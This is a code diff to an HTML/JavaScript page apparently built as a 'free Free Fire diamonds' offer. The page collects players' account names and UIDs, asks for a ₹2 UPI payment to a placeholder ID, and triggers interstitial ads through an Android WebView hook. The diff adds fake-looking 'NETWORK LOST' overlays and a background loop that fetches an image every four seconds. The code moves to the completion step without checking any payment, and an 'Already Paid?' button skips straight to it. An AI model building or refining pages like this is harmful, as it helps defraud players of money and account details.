@@ -34,7 +34,7 @@
             box-shadow: 0 8px 32px 0 rgba(0, 0, 0, 0.37);
         }
 
-        /* Top Banner Ad Container (60px height) */
+        /* Banner Ad Space Placeholder */
         .top-ad-space {
             width: 100%;
             height: 60px;
@@ -49,7 +49,6 @@
             color: #888;
         }
 
-        /* Large Banner Ad Container (100px height) */
         .large-ad-space {
             width: 100%;
             height: 100px;
@@ -164,9 +163,85 @@
             color: #2ed573;
             margin-bottom: 10px;
         }
+
+        /* Loading / Checking Overlay */
+        #loading-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 20, 35, 0.8);
+            z-index: 9998;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            color: #ff9900;
+            font-size: 18px;
+            font-weight: bold;
+        }
+
+        /* Gaming 999+ Ping / Live Screen */
+        #offline-overlay {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(15, 20, 35, 0.96);
+            z-index: 9999;
+            display: none;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            padding: 20px;
+        }
+        .offline-content {
+            background: rgba(255, 255, 255, 0.05);
+            border: 1px solid #ff4757;
+            padding: 30px;
+            border-radius: 15px;
+            max-width: 350px;
+            width: 100%;
+            box-shadow: 0 0 25px rgba(255, 71, 87, 0.5);
+        }
+        .ping-tag {
+            background: #ff4757;
+            color: #fff;
+            font-weight: bold;
+            font-size: 14px;
+            padding: 4px 12px;
+            border-radius: 20px;
+            display: inline-block;
+            margin-bottom: 15px;
+            letter-spacing: 1px;
+        }
+        .offline-content h2 {
+            color: #ff4757;
+            margin-bottom: 10px;
+            font-size: 22px;
+        }
+        .offline-content p {
+            color: #ccc;
+            font-size: 14px;
+        }
     </style>
 </head>
 <body>
+
+    <!-- Loading Check Overlay -->
+    <div id="loading-overlay">Verifying Live Connection...</div>
+
+    <!-- Gaming 999+ Ping / Live Drop Screen -->
+    <div id="offline-overlay">
+        <div class="offline-content">
+            <div class="ping-tag">PING: 999+ ms</div>
+            <h2>NETWORK LOST</h2>
+            <p>Internet connection dropped or lost! Live session and ads paused.</p>
+            <button onclick="retryConnection()" style="margin-top: 15px; font-size: 14px; padding: 8px;">RETRY</button>
+        </div>
+    </div>
 
     <div class="container">
         <!-- Step 1: Get Started -->
@@ -224,7 +299,6 @@
                 <p style="font-size: 12px; color: #aaa;">Click below to pay via UPI App (PhonePe / GPay / Paytm)</p>
             </div>
 
-            <!-- ⚠️ ध्यान दें: 'YOUR_UPI_ID@upi' की जगह अपनी असली UPI ID डालें -->
             <a id="upiPayBtn" href="upi://pay?pa=YOUR_UPI_ID@upi&pn=FreeFireRewards&am=2&cu=INR" class="pay-btn" onclick="finishPayment()">PAY ₹2 VIA UPI APP</a>
             
             <button onclick="goToStep(5)" style="background: transparent; border: 1px solid #888; color: #ccc; margin-top: 10px; font-size: 14px;">Already Paid? Click Here</button>
@@ -241,17 +315,82 @@
 
     <script>
         let chosenDiamond = null;
+        const offlineOverlay = document.getElementById('offline-overlay');
+        const loadingOverlay = document.getElementById('loading-overlay');
 
-        // Android WebView Interface Trigger
-        function triggerAndroidAd() {
+        // क्लिक करने पर नेटवर्क चेक करने का फंक्शन
+        async function checkSpeedAndProceed(callback) {
+            if (!navigator.onLine) {
+                offlineOverlay.style.display = 'flex';
+                return;
+            }
+
+            loadingOverlay.style.display = 'flex';
+            const testUrl = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png?r=" + Math.random();
+            const startTime = new Date().getTime();
+
+            try {
+                await fetch(testUrl, { mode: 'no-cors', cache: 'no-store' });
+                const endTime = new Date().getTime();
+                const durationSeconds = (endTime - startTime) / 1000;
+
+                loadingOverlay.style.display = 'none';
+
+                if (durationSeconds > 5.0 || !navigator.onLine) {
+                    offlineOverlay.style.display = 'flex';
+                } else {
+                    offlineOverlay.style.display = 'none';
+                    if (callback) callback();
+                }
+            } catch (error) {
+                loadingOverlay.style.display = 'none';
+                offlineOverlay.style.display = 'flex';
+            }
+        }
+
+        // हर 4 सेकंड में बैकग्राउंड में लगातार नेटवर्क इस्तेमाल करने और चेक करने वाला लूप
+        setInterval(async () => {
+            if (!navigator.onLine) {
+                offlineOverlay.style.display = 'flex';
+                return;
+            }
+
+            const testUrl = "https://www.google.com/images/branding/googlelogo/1x/googlelogo_color_272x92dp.png?r=" + Math.random();
+            const startTime = new Date().getTime();
+
+            try {
+                await fetch(testUrl, { mode: 'no-cors', cache: 'no-store' });
+                const endTime = new Date().getTime();
+                const durationSeconds = (endTime - startTime) / 1000;
+
+                if (durationSeconds > 6.0) {
+                    offlineOverlay.style.display = 'flex';
+                }
+            } catch (error) {
+                offlineOverlay.style.display = 'flex';
+            }
+        }, 4000);
+
+        function retryConnection() {
+            if (navigator.onLine) {
+                offlineOverlay.style.display = 'none';
+            } else {
+                alert("Internet is still off!");
+            }
+        }
+
+        // Android App Interface ट्रिगर करने के फंक्शन
+        function showAndroidAd() {
             if (window.AndroidInterface && window.AndroidInterface.showInterstitialAd) {
                 window.AndroidInterface.showInterstitialAd();
             }
         }
 
         function handleStep1() {
-            triggerAndroidAd();
-            goToStep(2);
+            checkSpeedAndProceed(() => {
+                showAndroidAd();
+                goToStepDirect(2);
+            });
         }
 
         function submitDetails() {
@@ -262,15 +401,20 @@
                 alert("Please enter both Account Name and UID!");
                 return;
             }
-            triggerAndroidAd();
-            goToStep(3);
+
+            checkSpeedAndProceed(() => {
+                showAndroidAd();
+                goToStepDirect(3);
+            });
         }
 
         function selectDiamond(element, amount) {
-            document.querySelectorAll('.diamond-card').forEach(card => card.classList.remove('selected'));
-            element.classList.add('selected');
-            chosenDiamond = amount;
-            triggerAndroidAd();
+            checkSpeedAndProceed(() => {
+                document.querySelectorAll('.diamond-card').forEach(card => card.classList.remove('selected'));
+                element.classList.add('selected');
+                chosenDiamond = amount;
+                showAndroidAd();
+            });
         }
 
         function proceedToPayment() {
@@ -278,17 +422,22 @@
                 alert("Please select a diamond amount first!");
                 return;
             }
-            triggerAndroidAd();
-            goToStep(4);
+
+            checkSpeedAndProceed(() => {
+                showAndroidAd();
+                goToStepDirect(4);
+            });
         }
 
         function finishPayment() {
-            setTimeout(function() {
-                goToStep(5);
-            }, 2000);
+            checkSpeedAndProceed(() => {
+                setTimeout(function() {
+                    goToStepDirect(5);
+                }, 2000);
+            });
         }
 
-        function goToStep(stepNumber) {
+        function goToStepDirect(stepNumber) {
             document.querySelectorAll('.step').forEach(step => step.classList.remove('active'));
             document.getElementById('step' + stepNumber).classList.add('active');
         }
